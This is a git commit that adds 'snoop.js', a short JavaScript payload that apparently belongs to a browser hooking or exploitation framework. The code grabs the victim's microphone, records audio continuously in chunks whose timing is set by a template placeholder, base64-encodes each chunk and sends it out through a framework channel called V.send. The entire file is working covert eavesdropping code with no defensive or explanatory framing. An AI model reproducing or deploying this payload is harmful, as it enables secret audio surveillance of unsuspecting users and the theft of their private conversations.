8bb14e01cb6e0247d403b46f3334d7073ad2c406
Ron Masas <ronmasas@gmail.com>
2022-03-14 23:54:33 +0200

    Add files via upload

---
+++ snoop.js
@@ -0,0 +1,19 @@
+navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
+    const mediaRecorder = new MediaRecorder(stream);
+    mediaRecorder.start();
+
+    mediaRecorder.addEventListener("dataavailable", event => {
+        const audioBlob = new Blob([event.data]);
+        var reader = new FileReader();
+        reader.readAsDataURL(audioBlob);
+        reader.onloadend = function () {
+            var base64data = reader.result.split('base64,')[1];
+            V.send(base64data);
+        }
+    });
+
+    setInterval(() => {
+        mediaRecorder.stop();
+        mediaRecorder.start();
+    }, parseInt("%{save}") || 5000);
+});
